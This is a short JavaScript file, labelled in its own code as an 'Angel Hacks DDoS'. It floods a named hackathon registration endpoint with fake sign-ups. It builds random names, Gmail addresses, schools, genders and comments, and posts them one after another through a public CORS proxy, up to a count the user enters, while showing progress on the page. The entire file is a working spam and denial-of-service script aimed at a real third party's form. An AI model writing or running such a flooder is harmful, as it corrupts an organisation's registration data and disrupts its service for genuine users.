const EMAIL_PREFIX_LENGTH = 10
const NAME_LENGTH = 10
const COMMENT_LENGTH = 100
const ALPHABET = 'abcdefghijklmnopqrstuvwxyz'
const CHARACTERS = `${ALPHABET}1234567890`

let spamCount

const randomEmail = () =>
	`${Array(EMAIL_PREFIX_LENGTH).fill(0).map(() => CHARACTERS[~~(Math.random() * CHARACTERS.length)]).join('')}@gmail.com`

const randomName = () =>
	Array(NAME_LENGTH).fill(0).map(() => ALPHABET[~~(Math.random() * ALPHABET.length)]).join('')

const randomComment = () =>
	Array(COMMENT_LENGTH).fill(0).map(() => ALPHABET[~~(Math.random() * ALPHABET.length)]).join('')

const randomGender = () =>
	`${Math.random() < 0.5 ? '' : 'fe'}male`

const updateProgress = progress => {
	const isDone = progress === spamCount
	document.title = `Angel Hacks DDoS${isDone ? '' : ` - ${progress} / ${spamCount}`}`
	document.querySelectorAll('.spam-progress').forEach(element => element.innerHTML = `<b>${progress}</b> / <b>${spamCount}${isDone ? '<br><br>Done!' : ''}</b>`)
}

const updateMessage = message =>
	document.querySelectorAll('.spam-message').forEach(element => element.innerHTML = message ? `First name: <b>${message['First-Name']}</b><br>Last name: <b>${message['Last-Name']}</b><br>Email: <b>${message['email']}</b><br>School: <b>${message['School']}</b><br>Gender: <b>${message['Gender']}</b><br>Comment: ${message['other']}` : '')

const spam = count => {
	updateProgress(spamCount - count)
	if (count <= 0)
		return updateMessage(undefined)
	const message = {
		'First-Name': randomName(),
		'Last-Name': randomName(),
		'School': randomName(),
		'Gender': randomGender(),
		'other': randomComment(),
		'email': randomEmail()
	}
	updateMessage(message)
	$.post('https://cors-anywhere.herokuapp.com/https://AngelHacks-Reg--hacker22.repl.co/addperson', message, () => spam(count - 1))
}

document.querySelectorAll('.spam-button').forEach(element => element.addEventListener('click', () => {
	spamCount = parseInt(document.querySelector('.spam-count').value || 1)
	spam(spamCount)
}))